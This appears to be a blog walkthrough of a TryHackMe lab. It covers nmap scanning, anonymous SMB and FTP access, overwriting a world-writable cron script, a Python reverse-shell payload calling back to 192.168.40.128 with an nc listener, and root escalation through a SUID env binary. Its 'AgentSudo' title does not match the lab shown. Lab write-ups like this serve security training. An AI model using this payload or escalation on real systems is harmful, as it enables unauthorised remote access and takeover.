---
title: <img width="50" height="50" alt="img" src="https://github.com/thelocalh0st/thelocalh0st.github.io/assets/95465072/de6eece3-9ff2-4439-9c01-c6433e45bc04"> AgentSudo | Tryhackme | Walkthrough 
date: 2023-12-15 07:00:02 +730
categories: [Write Up, TryHackMe]
tags: [agent-sudo,walkthrough,tryhackme,privilege-escalation,hydra,100-days-of-cybersecurity] # TAG names should always be lowercase


---


<h1 style="color: cyan; text-align: center">100 Day's Of Cybersecurity - Day 6</h1>




## Nmap 

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -sC -T4 10.10.215.229
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-14 07:04 EST
Nmap scan report for 10.10.215.229
Host is up (0.24s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.105.144
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 3s, deviation: 1s, median: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-14T12:05:13
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-12-14T12:05:14+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.56 seconds
```

## 1️⃣ Lets Start with SMB 👨🏻‍💻

```
smbclient -L //10.10.107.211
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
```

Lets Get into **pics** share 

`smbclient -N \\\\10.10.107.211\\pics`

```
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020
```

Download it through `mget`

```
smb: \> prompt
smb: \> mget *
getting file \corgo2.jpg of size 42663 as corgo2.jpg (87.9 KiloBytes/sec) (average 87.9 KiloBytes/sec)
getting file \puppos.jpeg of size 265188 as puppos.jpeg (470.0 KiloBytes/sec) (average 293.3 KiloBytes/sec)
```

After a hard try on those images with `strings` , `steghide` , `stegosolve` `stegseek` ended up with nothing!! 


## 2️⃣ FTP 

```
ftp 10.10.107.211
Connected to 10.10.107.211.
220 NamelessOne's FTP Server!
Name (10.10.107.211:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||35464|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||15525|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1548 Jan 25 03:41 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

`Download all the three files with mget`

### to_do.txt
```
cat to_do.txt
I really need to disable the anonymous login...it's really not safe
```

### clean.sh 
```
cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

### removed_files.log
```
cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

## 3️⃣ Get Set GO 🏁 

so this clean.sh is attached to a cronjob basically the clean.sh removes files from /tmp directory and keep the updates in removed_files.log file 

Considering **clean.sh** is running every so often and it has **rwxr-xrwx** permissions we may be able to modify the script on our own system and then upload it to the FTP server replacing the existing file.

## 4️⃣ Getting Reverse shell 


Payload
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.40.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

Listner 
```
nc -lnvp 1234
```

```
namelessone@anonymous:~$ ls
pics  user.txt
```

## 5️⃣ Privilege Escalation

`Gtfobins`

```
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# whoami
root
```

![](https://media.giphy.com/media/DAtJCG1t3im1G/giphy.gif)